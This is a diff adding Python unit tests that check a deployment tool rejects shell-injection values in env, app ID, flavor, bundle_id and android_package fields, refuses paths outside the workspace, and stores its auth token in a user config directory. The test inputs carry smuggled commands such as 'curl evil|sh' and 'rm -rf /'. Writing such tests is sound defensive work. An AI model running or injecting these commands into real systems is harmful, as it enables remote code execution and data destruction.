@@ -16,6 +16,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "features" / "deplo
 import config
 import commands
 import server
+import jobs
 
 
 class TestSecurityGuards(unittest.TestCase):
@@ -220,6 +221,72 @@ class TestSecurityGuards(unittest.TestCase):
         root = config.get_workspace_root()
         self.assertIsInstance(root, Path)
         self.assertTrue(root.exists())
+
+    def test_execute_command_rejects_malicious_env(self):
+        """execute_command must reject env with shell injection metacharacters."""
+        res = jobs.execute_command(
+            app="test_app",
+            command="echo building any",
+            env="dev; curl evil|sh",
+        )
+        self.assertFalse(res["success"])
+        self.assertIn("Invalid env", res["error"])
+
+    def test_execute_command_rejects_malicious_app_id(self):
+        """execute_command must reject app IDs with shell injection metacharacters."""
+        res = jobs.execute_command(
+            app="test_app; rm -rf /",
+            command="echo building",
+        )
+        self.assertFalse(res["success"])
+        self.assertIn("Invalid app ID", res["error"])
+
+    def test_execute_command_rejects_malicious_flavor(self):
+        """execute_command must reject flavor parameter with shell injection metacharacters."""
+        res = jobs.execute_command(
+            app="test_app",
+            command="echo building",
+            flavor="dev && id",
+        )
+        self.assertFalse(res["success"])
+        self.assertIn("Invalid flavor parameter", res["error"])
+
+    def test_save_deploy_config_rejects_plain_keys_injection(self):
+        """save_deploy_config must reject plain bundle_id and android_package injection."""
+        bad_config_plain_bundle = {
+            "apps": {
+                "demo": {
+                    "bundle_id": "x; curl evil | sh",
+                }
+            }
+        }
+        res = config.save_deploy_config(bad_config_plain_bundle)
+        self.assertFalse(res["success"])
+        self.assertIn("Invalid value for 'bundle_id'", res["error"])
+
+        bad_config_plain_pkg = {
+            "apps": {
+                "demo": {
+                    "android_package": "com.evil && touch /tmp/pwn",
+                }
+            }
+        }
+        res2 = config.save_deploy_config(bad_config_plain_pkg)
+        self.assertFalse(res2["success"])
+        self.assertIn("Invalid value for 'android_package'", res2["error"])
+
+    def test_add_app_path_traversal_restricted(self):
+        """add_app must reject paths outside the allowed workspace roots."""
+        res = config.add_app({"id": "evil_app", "path": "/etc"})
+        self.assertFalse(res["success"])
+        self.assertIn("Path traversal restriction", res["error"])
+
+    def test_auth_token_stored_in_user_config_dir(self):
+        """Auth token file must be located in ~/.config/dev-deployment/auth_token.txt."""
+        token_file = server._get_auth_token_file()
+        expected_dir = Path.home() / ".config" / "dev-deployment"
+        self.assertEqual(token_file.parent, expected_dir)
+        self.assertEqual(token_file.name, "auth_token.txt")
 
 
 if __name__ == "__main__":
